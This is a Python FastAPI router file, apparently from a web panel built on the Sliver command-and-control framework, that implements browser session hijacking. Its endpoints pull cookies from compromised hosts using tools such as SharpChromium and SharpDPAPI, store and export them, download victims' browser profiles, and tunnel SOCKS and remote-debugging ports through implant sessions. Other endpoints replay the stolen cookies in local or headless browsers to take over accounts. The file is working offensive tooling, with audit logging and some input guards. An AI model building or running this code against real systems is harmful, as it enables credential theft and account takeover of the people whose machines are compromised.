"""
Browser Operations API endpoints

Provides browser session hijacking workflows:
- Cookie extraction (SharpChromium, SharpDPAPI, CookieMonster, manual)
- Cookie storage, search, and export (Netscape, JSON, EditThisCookie, Header)
- SOCKS5 proxy with browser config generation
- CDP remote debugging port forwarding
- Browser detection and profile download
- CDP cookie injection into local browser
- Playwright headless browser automation
"""

import logging
from datetime import datetime, timezone
from typing import Optional

from fastapi import APIRouter, Depends, HTTPException, Query, Request, status
from fastapi.responses import Response
from sqlalchemy import select, delete
from sqlalchemy.ext.asyncio import AsyncSession

from app.api.deps import get_sliver, require_permission, get_db
from app.core.exceptions import SliverCommandError
from app.services.sliver_client import SliverManager
from app.services.browser_ops import BrowserOpsService
from app.services.playwright_service import get_playwright_service
from app.models import User, AuditLog
from app.models.browser_data import BrowserCookie
from app.schemas.browser_ops import (
    ExtractCookiesRequest,
    ExtractCookiesResponse,
    CookieItem,
    CookieListResponse,
    ExportCookiesRequest,
    ExportCookiesResponse,
    StartProxyRequest,
    StartProxyResponse,
    StopProxyRequest,
    StartCDPRequest,
    StartCDPResponse,
    StopCDPRequest,
    BrowserInfoResponse,
    DownloadProfileRequest,
    DownloadProfileResponse,
    ProfileFileInfo,
    InjectCookiesRequest,
    InjectCookiesResponse,
    CDPTarget,
    CDPTargetsResponse,
    StartAutomationRequest,
    StartAutomationResponse,
    NavigateRequest,
    NavigateResponse,
    ScreenshotRequest,
    ScreenshotResponse,
    ExecuteJSRequest,
    ExecuteJSResponse,
    AutomationCookiesResponse,
    StopAutomationRequest,
)
from app.schemas.common import MessageResponse

logger = logging.getLogger(__name__)

router = APIRouter()


# ═══════════════════════════════════════════════════════════════════════════
# Cookie Extraction
# ═══════════════════════════════════════════════════════════════════════════


@router.post("/extract-cookies", response_model=ExtractCookiesResponse)
async def extract_cookies(
    req: ExtractCookiesRequest,
    request: Request,
    sliver: SliverManager = Depends(get_sliver),
    user: User = Depends(require_permission("browser_ops", "execute")),
    db: AsyncSession = Depends(get_db),
):
    """
    Extract cookies from target browser using the specified method.
    Parses output into structured cookies and stores them in the database.
    """
    session = await sliver.get_session(req.session_id)
    if not session:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Session {req.session_id} not found",
        )

    try:
        svc = BrowserOpsService(sliver)
        result = await svc.extract_cookies(
            session_id=req.session_id,
            browser=req.browser,
            method=req.method,
            target_domain=req.target_domain,
            assembly_path=req.assembly_path,
            timeout=req.timeout,
        )
    except SliverCommandError as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Cookie extraction failed: {e}",
        )

    hostname = session.get("hostname", "")
    now = datetime.now(timezone.utc)

    # Store cookies in database
    db_cookies = []
    for c in result["cookies"]:
        db_cookie = BrowserCookie(
            session_id=req.session_id,
            hostname=hostname,
            browser=req.browser,
            method=req.method,
            domain=c["domain"],
            name=c["name"],
            value=c["value"],
            path=c.get("path", "/"),
            expires=c.get("expires"),
            secure=c.get("secure", False),
            http_only=c.get("http_only", False),
            same_site=c.get("same_site"),
            extracted_at=now,
            extracted_by=user.id,
        )
        db.add(db_cookie)
        db_cookies.append(db_cookie)

    # Audit log
    audit = AuditLog(
        user_id=user.id,
        action="extract_cookies",
        resource="browser_ops",
        resource_id=req.session_id,
        details={
            "browser": req.browser,
            "method": req.method,
            "target_domain": req.target_domain,
            "cookies_found": len(db_cookies),
            "hostname": hostname,
        },
        ip_address=request.client.host if request.client else None,
    )
    db.add(audit)
    await db.commit()

    # Build response with DB-assigned IDs
    stored_cookies = [
        CookieItem(
            id=db_cookie.id,
            domain=db_cookie.domain,
            name=db_cookie.name,
            value=db_cookie.value,
            path=db_cookie.path,
            expires=db_cookie.expires,
            secure=db_cookie.secure,
            http_only=db_cookie.http_only,
            same_site=db_cookie.same_site,
        )
        for db_cookie in db_cookies
    ]

    return ExtractCookiesResponse(
        cookies=stored_cookies,
        raw_output=result["raw_output"][:50000],  # Truncate for safety
        browser=req.browser,
        method=req.method,
        session_id=req.session_id,
        hostname=hostname,
        extracted_at=now.isoformat(),
        count=len(stored_cookies),
    )


@router.get("/cookies", response_model=CookieListResponse)
async def list_cookies(
    session_id: Optional[str] = Query(None, description="Filter by session"),
    domain: Optional[str] = Query(None, description="Filter by domain"),
    name: Optional[str] = Query(None, description="Filter by cookie name"),
    skip: int = Query(0, ge=0, description="Number of records to skip"),
    limit: int = Query(100, ge=1, le=1000, description="Max records to return"),
    user: User = Depends(require_permission("browser_ops", "read")),
    db: AsyncSession = Depends(get_db),
):
    """Query stored cookies with optional filters (paginated)"""
    from sqlalchemy import func

    base_query = select(BrowserCookie)

    if session_id:
        base_query = base_query.where(BrowserCookie.session_id == session_id)
    if domain:
        base_query = base_query.where(BrowserCookie.domain.contains(domain))
    if name:
        base_query = base_query.where(BrowserCookie.name.contains(name))

    # Get total count
    count_result = await db.execute(
        select(func.count()).select_from(base_query.subquery())
    )
    total = count_result.scalar() or 0

    # Paginated results
    query = (
        base_query.order_by(BrowserCookie.extracted_at.desc()).offset(skip).limit(limit)
    )
    result = await db.execute(query)
    rows = result.scalars().all()

    cookies = [
        CookieItem(
            id=row.id,
            domain=row.domain,
            name=row.name,
            value=row.value,
            path=row.path,
            expires=row.expires,
            secure=row.secure,
            http_only=row.http_only,
            same_site=row.same_site,
        )
        for row in rows
    ]

    return CookieListResponse(cookies=cookies, total=total)


@router.post("/cookies/export", response_model=ExportCookiesResponse)
async def export_cookies(
    req: ExportCookiesRequest,
    user: User = Depends(require_permission("browser_ops", "read")),
    db: AsyncSession = Depends(get_db),
):
    """Export cookies in the requested format"""
    query = select(BrowserCookie)

    if req.cookie_ids:
        query = query.where(BrowserCookie.id.in_(req.cookie_ids))
    if req.session_id:
        query = query.where(BrowserCookie.session_id == req.session_id)
    if req.domain_filter:
        query = query.where(BrowserCookie.domain.contains(req.domain_filter))

    result = await db.execute(query)
    rows = result.scalars().all()

    cookies = [row.to_dict() for row in rows]

    svc = BrowserOpsService(sliver=None)
    export_result = svc.export_cookies(cookies, fmt=req.format)

    return ExportCookiesResponse(**export_result)


@router.delete("/cookies", response_model=MessageResponse)
async def delete_cookies(
    request: Request,
    session_id: Optional[str] = Query(
        None, description="Delete cookies for this session"
    ),
    user: User = Depends(require_permission("browser_ops", "delete")),
    db: AsyncSession = Depends(get_db),
):
    """Delete stored cookies"""
    stmt = delete(BrowserCookie)
    if session_id:
        stmt = stmt.where(BrowserCookie.session_id == session_id)

    result = await db.execute(stmt)
    count = result.rowcount

    # Audit log
    audit = AuditLog(
        user_id=user.id,
        action="delete_cookies",
        resource="browser_ops",
        resource_id=session_id or "all",
        details={"deleted_count": count},
        ip_address=request.client.host if request.client else None,
    )
    db.add(audit)
    await db.commit()

    return MessageResponse(message=f"Deleted {count} cookies")


# ═══════════════════════════════════════════════════════════════════════════
# SOCKS Proxy with Browser Config
# ═══════════════════════════════════════════════════════════════════════════


@router.post("/start-proxy", response_model=StartProxyResponse)
async def start_proxy(
    req: StartProxyRequest,
    request: Request,
    sliver: SliverManager = Depends(get_sliver),
    user: User = Depends(require_permission("browser_ops", "execute")),
    db: AsyncSession = Depends(get_db),
):
    """Start SOCKS5 proxy and return browser configuration snippets"""
    session = await sliver.get_session(req.session_id)
    if not session:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Session {req.session_id} not found",
        )

    try:
        result = await sliver.start_socks_proxy(req.session_id, "127.0.0.1", req.port)
    except SliverCommandError as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Failed to start proxy: {e}",
        )

    # Generate browser configs
    svc = BrowserOpsService(sliver)
    configs = svc.generate_proxy_configs("127.0.0.1", req.port)

    # Audit log
    audit = AuditLog(
        user_id=user.id,
        action="start_browser_proxy",
        resource="browser_ops",
        resource_id=req.session_id,
        details={"port": req.port, "hostname": session.get("hostname")},
        ip_address=request.client.host if request.client else None,
    )
    db.add(audit)
    await db.commit()

    return StartProxyResponse(
        tunnel_id=result.get("id", 0),
        host="127.0.0.1",
        port=req.port,
        **configs,
    )


@router.post("/stop-proxy", response_model=MessageResponse)
async def stop_proxy(
    req: StopProxyRequest,
    request: Request,
    sliver: SliverManager = Depends(get_sliver),
    user: User = Depends(require_permission("browser_ops", "execute")),
    db: AsyncSession = Depends(get_db),
):
    """Stop SOCKS5 proxy"""
    session = await sliver.get_session(req.session_id)
    if not session:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Session {req.session_id} not found",
        )

    try:
        await sliver.stop_socks_proxy(req.session_id, req.tunnel_id)
    except SliverCommandError as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Failed to stop proxy: {e}",
        )

    # Audit log
    audit = AuditLog(
        user_id=user.id,
        action="stop_browser_proxy",
        resource="browser_ops",
        resource_id=req.session_id,
        details={"tunnel_id": req.tunnel_id},
        ip_address=request.client.host if request.client else None,
    )
    db.add(audit)
    await db.commit()

    return MessageResponse(message=f"SOCKS proxy {req.tunnel_id} stopped")


# ═══════════════════════════════════════════════════════════════════════════
# CDP Remote Debugging
# ═══════════════════════════════════════════════════════════════════════════


@router.post("/start-cdp", response_model=StartCDPResponse)
async def start_cdp(
    req: StartCDPRequest,
    request: Request,
    sliver: SliverManager = Depends(get_sliver),
    user: User = Depends(require_permission("browser_ops", "execute")),
    db: AsyncSession = Depends(get_db),
):
    """Set up CDP remote debugging port forward"""
    session = await sliver.get_session(req.session_id)
    if not session:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Session {req.session_id} not found",
        )

    try:
        # Port forward: local_port -> target's remote_port (127.0.0.1 on target)
        result = await sliver.start_portfwd(
            req.session_id,
            remote_host="127.0.0.1",
            remote_port=req.remote_port,
            local_host="127.0.0.1",
            local_port=req.local_port,
        )
    except SliverCommandError as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Failed to start CDP tunnel: {e}",
        )

    # Generate CDP connection URLs
    svc = BrowserOpsService(sliver)
    urls = svc.generate_cdp_urls("127.0.0.1", req.local_port)

    # Audit log
    audit = AuditLog(
        user_id=user.id,
        action="start_cdp",
        resource="browser_ops",
        resource_id=req.session_id,
        details={
            "remote_port": req.remote_port,
            "local_port": req.local_port,
            "hostname": session.get("hostname"),
        },
        ip_address=request.client.host if request.client else None,
    )
    db.add(audit)
    await db.commit()

    return StartCDPResponse(
        tunnel_id=result.get("id", 0),
        **urls,
    )


@router.post("/stop-cdp", response_model=MessageResponse)
async def stop_cdp(
    req: StopCDPRequest,
    request: Request,
    sliver: SliverManager = Depends(get_sliver),
    user: User = Depends(require_permission("browser_ops", "execute")),
    db: AsyncSession = Depends(get_db),
):
    """Stop CDP port forward"""
    session = await sliver.get_session(req.session_id)
    if not session:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Session {req.session_id} not found",
        )

    try:
        await sliver.stop_portfwd(req.session_id, req.tunnel_id)
    except SliverCommandError as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Failed to stop CDP tunnel: {e}",
        )

    # Audit log
    audit = AuditLog(
        user_id=user.id,
        action="stop_cdp",
        resource="browser_ops",
        resource_id=req.session_id,
        details={"tunnel_id": req.tunnel_id},
        ip_address=request.client.host if request.client else None,
    )
    db.add(audit)
    await db.commit()

    return MessageResponse(message=f"CDP port forward {req.tunnel_id} stopped")


# ═══════════════════════════════════════════════════════════════════════════
# Browser Detection & Profile
# ═══════════════════════════════════════════════════════════════════════════


@router.get("/browser-info/{session_id}", response_model=BrowserInfoResponse)
async def get_browser_info(
    session_id: str,
    sliver: SliverManager = Depends(get_sliver),
    user: User = Depends(require_permission("browser_ops", "read")),
):
    """Detect installed browsers and running instances on target"""
    session = await sliver.get_session(session_id)
    if not session:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Session {session_id} not found",
        )

    try:
        svc = BrowserOpsService(sliver)
        result = await svc.detect_browsers(session_id)
    except SliverCommandError as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Browser detection failed: {e}",
        )

    return BrowserInfoResponse(**result)


@router.post("/download-profile", response_model=DownloadProfileResponse)
async def download_profile(
    req: DownloadProfileRequest,
    request: Request,
    sliver: SliverManager = Depends(get_sliver),
    user: User = Depends(require_permission("browser_ops", "execute")),
    db: AsyncSession = Depends(get_db),
):
    """Download browser profile files from target and save locally"""
    session = await sliver.get_session(req.session_id)
    if not session:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Session {req.session_id} not found",
        )

    svc = BrowserOpsService(sliver)
    profile_files = await svc.get_profile_files(
        req.session_id, req.browser, req.profile_name
    )

    downloaded = []
    files_data = []
    for f in profile_files:
        try:
            os_type = session.get("os", "").lower()
            if os_type == "windows":
                remote_path = f"{f['base_path']}\\{f['profile']}\\{f['name']}"
            else:
                remote_path = f"{f['base_path']}/{f['profile']}/{f['name']}"

            data = await sliver.session_download(req.session_id, remote_path)
            files_data.append({"name": f["name"], "data": data})
            downloaded.append(
                ProfileFileInfo(
                    name=f["name"],
                    size=len(data),
                    local_path=remote_path,
                )
            )
        except Exception as e:
            logger.warning(f"Failed to download {f['name']}: {e}")
            continue

    # Save files locally for ZIP download and browser launch
    local_dir = ""
    if files_data:
        local_dir = svc.save_profile_locally(
            req.session_id, req.browser, req.profile_name, files_data
        )

    # Generate launch commands
    launch_commands = svc.generate_launch_commands(req.browser, local_dir)
    zip_url = f"/api/v1/browser-ops/profile-zip/{req.session_id}/{req.browser}"

    # Audit log
    audit = AuditLog(
        user_id=user.id,
        action="download_profile",
        resource="browser_ops",
        resource_id=req.session_id,
        details={
            "browser": req.browser,
            "profile": req.profile_name,
            "files_downloaded": len(downloaded),
            "hostname": session.get("hostname"),
            "local_dir": local_dir,
        },
        ip_address=request.client.host if request.client else None,
    )
    db.add(audit)
    await db.commit()

    return DownloadProfileResponse(
        files=downloaded,
        browser=req.browser,
        profile_name=req.profile_name,
        session_id=req.session_id,
        local_dir=local_dir,
        zip_url=zip_url,
        launch_commands=launch_commands,
    )


@router.get("/profile-zip/{session_id}/{browser}")
async def get_profile_zip(
    session_id: str,
    browser: str,
    user: User = Depends(require_permission("browser_ops", "read")),
):
    """Download browser profile as ZIP archive"""
    # Validate path components to prevent path traversal
    if ".." in session_id or "/" in session_id or "\\" in session_id:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invalid session_id",
        )
    if ".." in browser or "/" in browser or "\\" in browser:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invalid browser name",
        )

    svc = BrowserOpsService(sliver=None)

    from app.services.browser_ops import PROFILE_DATA_DIR

    profile_dir = PROFILE_DATA_DIR / session_id / browser
    # Ensure resolved path stays within PROFILE_DATA_DIR
    if not str(profile_dir.resolve()).startswith(str(PROFILE_DATA_DIR.resolve())):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invalid path",
        )
    if not profile_dir.exists():
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"No profile data found for session {session_id}/{browser}",
        )

    zip_bytes = svc.create_profile_zip(str(profile_dir))
    filename = f"profile_{session_id}_{browser}.zip"

    return Response(
        content=zip_bytes,
        media_type="application/zip",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


# ═══════════════════════════════════════════════════════════════════════════
# CDP Cookie Injection
# ═══════════════════════════════════════════════════════════════════════════


@router.post("/inject-cookies", response_model=InjectCookiesResponse)
async def inject_cookies(
    req: InjectCookiesRequest,
    request: Request,
    user: User = Depends(require_permission("browser_ops", "execute")),
    db: AsyncSession = Depends(get_db),
):
    """Inject stored cookies into a local browser via Chrome DevTools Protocol"""
    # Load cookies from DB
    query = select(BrowserCookie).where(BrowserCookie.id.in_(req.cookie_ids))
    result = await db.execute(query)
    rows = result.scalars().all()

    if not rows:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="No cookies found for the given IDs",
        )

    cookies = [row.to_dict() for row in rows]

    svc = BrowserOpsService(sliver=None)
    inject_result = await svc.inject_cookies_cdp(req.host, req.port, cookies)

    # Audit log
    audit = AuditLog(
        user_id=user.id,
        action="inject_cookies_cdp",
        resource="browser_ops",
        resource_id=f"{req.host}:{req.port}",
        details={
            "cookie_count": len(req.cookie_ids),
            "injected": inject_result["injected"],
            "failed": inject_result["failed"],
            "navigate_url": req.url,
        },
        ip_address=request.client.host if request.client else None,
    )
    db.add(audit)
    await db.commit()

    return InjectCookiesResponse(
        injected=inject_result["injected"],
        failed=inject_result["failed"],
        errors=inject_result["errors"],
        navigate_url=req.url,
    )


@router.get("/cdp-targets", response_model=CDPTargetsResponse)
async def list_cdp_targets(
    host: str = Query(default="127.0.0.1", description="CDP host (localhost only)"),
    port: int = Query(default=9222, ge=1, le=65535, description="CDP port"),
    user: User = Depends(require_permission("browser_ops", "read")),
):
    """List open tabs/targets in a CDP-enabled browser"""
    from app.schemas.browser_ops import ALLOWED_CDP_HOSTS

    if host not in ALLOWED_CDP_HOSTS:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"CDP host must be one of {sorted(ALLOWED_CDP_HOSTS)} to prevent SSRF",
        )

    svc = BrowserOpsService(sliver=None)
    targets_raw = await svc.list_cdp_targets(host, port)

    targets = [
        CDPTarget(
            id=t.get("id", ""),
            title=t.get("title", ""),
            url=t.get("url", ""),
            type=t.get("type", ""),
            webSocketDebuggerUrl=t.get("webSocketDebuggerUrl", ""),
        )
        for t in targets_raw
    ]

    return CDPTargetsResponse(targets=targets, host=host, port=port)


# ═══════════════════════════════════════════════════════════════════════════
# Playwright Automation
# ═══════════════════════════════════════════════════════════════════════════


@router.post("/automation/start", response_model=StartAutomationResponse)
async def start_automation(
    req: StartAutomationRequest,
    request: Request,
    user: User = Depends(require_permission("browser_ops", "execute")),
    db: AsyncSession = Depends(get_db),
):
    """Start a headless browser automation session with injected cookies"""
    # Load cookies from DB
    query = select(BrowserCookie).where(BrowserCookie.id.in_(req.cookie_ids))
    result = await db.execute(query)
    rows = result.scalars().all()

    if not rows:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="No cookies found for the given IDs",
        )

    cookies = [row.to_dict() for row in rows]

    pw_svc = get_playwright_service()
    try:
        automation_id = await pw_svc.start_session(
            cookies=cookies,
            user_agent=req.user_agent,
            viewport_width=req.viewport_width,
            viewport_height=req.viewport_height,
            proxy=req.proxy,
        )
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Failed to start automation: {e}",
        )

    response = StartAutomationResponse(automation_id=automation_id)

    # Navigate to initial URL if provided
    if req.url:
        try:
            nav_result = await pw_svc.navigate(
                automation_id, req.url, take_screenshot=True
            )
            response.screenshot = nav_result.get("screenshot")
            response.page_title = nav_result.get("title")
            response.page_url = nav_result.get("url")
        except Exception as e:
            logger.warning(f"Initial navigation failed: {e}")

    # Audit log
    audit = AuditLog(
        user_id=user.id,
        action="start_automation",
        resource="browser_ops",
        resource_id=automation_id,
        details={
            "cookie_count": len(req.cookie_ids),
            "initial_url": req.url,
            "user_agent": req.user_agent,
        },
        ip_address=request.client.host if request.client else None,
    )
    db.add(audit)
    await db.commit()

    return response


@router.post("/automation/navigate", response_model=NavigateResponse)
async def automation_navigate(
    req: NavigateRequest,
    user: User = Depends(require_permission("browser_ops", "execute")),
):
    """Navigate to a URL in an automation session"""
    pw_svc = get_playwright_service()
    try:
        result = await pw_svc.navigate(
            req.automation_id,
            req.url,
            wait_for=req.wait_for,
            take_screenshot=req.screenshot,
        )
    except ValueError as e:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail=str(e))
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Navigation failed: {e}",
        )

    return NavigateResponse(
        title=result.get("title", ""),
        url=result.get("url", ""),
        screenshot=result.get("screenshot"),
    )


@router.post("/automation/screenshot", response_model=ScreenshotResponse)
async def automation_screenshot(
    req: ScreenshotRequest,
    user: User = Depends(require_permission("browser_ops", "read")),
):
    """Take a screenshot of the current page"""
    pw_svc = get_playwright_service()
    try:
        result = await pw_svc.screenshot(req.automation_id, full_page=req.full_page)
    except ValueError as e:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail=str(e))
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Screenshot failed: {e}",
        )

    return ScreenshotResponse(**result)


@router.post("/automation/execute-js", response_model=ExecuteJSResponse)
async def automation_execute_js(
    req: ExecuteJSRequest,
    user: User = Depends(require_permission("browser_ops", "execute")),
):
    """Execute JavaScript in the automation page context"""
    pw_svc = get_playwright_service()
    try:
        result = await pw_svc.execute_js(req.automation_id, req.script)
    except ValueError as e:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail=str(e))

    return ExecuteJSResponse(**result)


@router.post("/automation/cookies", response_model=AutomationCookiesResponse)
async def automation_cookies(
    req: StopAutomationRequest,  # reuse: only needs automation_id
    user: User = Depends(require_permission("browser_ops", "read")),
):
    """Get all cookies from the automation browser context"""
    pw_svc = get_playwright_service()
    try:
        cookies_raw = await pw_svc.get_cookies(req.automation_id)
    except ValueError as e:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail=str(e))

    cookies = [
        CookieItem(
            domain=c.get("domain", ""),
            name=c.get("name", ""),
            value=c.get("value", ""),
            path=c.get("path", "/"),
            expires=c.get("expires"),
            secure=c.get("secure", False),
            http_only=c.get("http_only", False),
            same_site=c.get("same_site"),
        )
        for c in cookies_raw
    ]

    return AutomationCookiesResponse(cookies=cookies, count=len(cookies))


@router.post("/automation/stop", response_model=MessageResponse)
async def stop_automation(
    req: StopAutomationRequest,
    request: Request,
    user: User = Depends(require_permission("browser_ops", "execute")),
    db: AsyncSession = Depends(get_db),
):
    """Stop and cleanup an automation session"""
    pw_svc = get_playwright_service()
    await pw_svc.stop_session(req.automation_id)

    # Audit log
    audit = AuditLog(
        user_id=user.id,
        action="stop_automation",
        resource="browser_ops",
        resource_id=req.automation_id,
        details={},
        ip_address=request.client.host if request.client else None,
    )
    db.add(audit)
    await db.commit()

    return MessageResponse(message=f"Automation session {req.automation_id} stopped")
